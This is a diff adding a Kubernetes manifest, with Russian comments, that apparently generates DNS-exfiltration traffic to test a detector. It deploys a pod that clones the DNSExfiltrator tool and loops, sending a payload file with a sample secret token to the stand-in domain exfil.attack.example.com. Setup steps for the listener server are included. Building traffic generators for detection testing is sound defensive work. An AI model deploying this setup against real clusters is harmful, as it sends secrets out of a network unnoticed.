@@ -1,0 +1,76 @@
+# DNSExfiltrator client — data exfil over DNS. Генерирует: BASE64_SUBDOMAIN, MANY_SUBDOMAINS, HIGH_ENTROPY.
+#
+# Требуется: снаружи кластера должен работать DNSExfiltrator server (listen.py).
+# 1) Клонировать https://github.com/Arno0x/DNSExfiltrator, запустить: python listen.py EXFIL_DOMAIN
+# 2) Делегировать поддомен на сервер (authoritative DNS отдаёт запросы на listen.py или relay).
+# 3) Задать EXFIL_DOMAIN и задеплоить. Под клонирует репо и в цикле экфильтрирует payload.
+#
+# Без сервера запросы всё равно уйдут в DNS — детектор увидит трафик.
+---
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: exfil-payload
+  namespace: attack
+  labels:
+    app: attack-traffic
+    tool: dnsexfiltrator
+data:
+  payload.txt: |
+    sample data for dns exfil test
+    line2
+    secret_token_12345
+---
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: dnsexfiltrator-client
+  namespace: attack
+  labels:
+    app: attack-traffic
+    tool: dnsexfiltrator
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: attack-traffic
+      tool: dnsexfiltrator
+  template:
+    metadata:
+      labels:
+        app: attack-traffic
+        tool: dnsexfiltrator
+    spec:
+      containers:
+        - name: exfil
+          image: python:3.11-alpine
+          command: ["/bin/sh", "-c"]
+          args:
+            - |
+              apk add --no-cache git
+              if [ ! -d DNSExfiltrator ]; then
+                git clone --depth 1 https://github.com/Arno0x/DNSExfiltrator.git
+              fi
+              cd DNSExfiltrator
+              while true; do
+                python dnsexfiltrator.py -d "$EXFIL_DOMAIN" /payload/payload.txt 2>/dev/null || true
+                sleep 30
+              done
+          env:
+            - name: EXFIL_DOMAIN
+              value: "exfil.attack.example.com"
+          volumeMounts:
+            - name: payload
+              mountPath: /payload
+          resources:
+            requests:
+              cpu: 50m
+              memory: 128Mi
+            limits:
+              cpu: 200m
+              memory: 256Mi
+      volumes:
+        - name: payload
+          configMap:
+            name: exfil-payload
+      restartPolicy: Always
